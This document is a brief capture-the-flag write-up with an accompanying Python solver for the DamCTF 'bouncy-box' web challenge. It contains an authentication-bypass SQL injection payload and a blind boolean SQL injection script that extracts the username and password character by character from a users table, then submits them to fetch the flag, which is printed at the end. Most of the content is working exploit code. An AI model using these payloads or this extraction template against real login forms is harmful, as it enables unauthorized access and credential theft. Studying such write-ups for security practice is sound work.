'''
In this login form with SQL injection error, with middle payload' or '1'='1'-- - enter the username box, I easily bypass the authentication mechanism and the Free flag button appears when I click it. The second login form appears, it seems that this form does not have SQL injection errors, I will use the first login form to detect the username and password to log in to the 2nd login form
'''

#https://bouncy-box.chals.damctf.xyz/
#https://github.com/magnetohvcs/ctf/tree/main/damctf/web-bouncy-box

#sql injection bruteforce template
#pre-condition: know the table name is users, column names are username and password?
#compare each char with ascii(substr(select username from users limit 1),x,1))

import requests
import string

s = requests.session()

url = 'https://bouncy-box.chals.damctf.xyz/login'

arr = ',' + string.printable

def blind_row(column,step):
    for char in arr:
        res = s.post(url,json={"username":f"admin' or ascii(substr((select {column} from users limit 1),{step},1))={ord(char)}-- -",
        "password":"admin","score":0}).status_code
        if res==200:
            return char
    return None

def rows(column):
    row = ''
    step = len(row) +1
    while True:
        char = blind_row(column,step)
        if char == None:
            return row
        row += char
        step += 1
        print('[+] %s = '%column,row)

username = rows('username')
password = rows('password')

flag = s.post('https://bouncy-box.chals.damctf.xyz/flag',data={'username_input':username,'password_input':password}).text
print(flag)
# dam{b0uNCE_B0UNcE_b0uncE_B0uNCY_B0unce_b0Unce_b0Unc3}
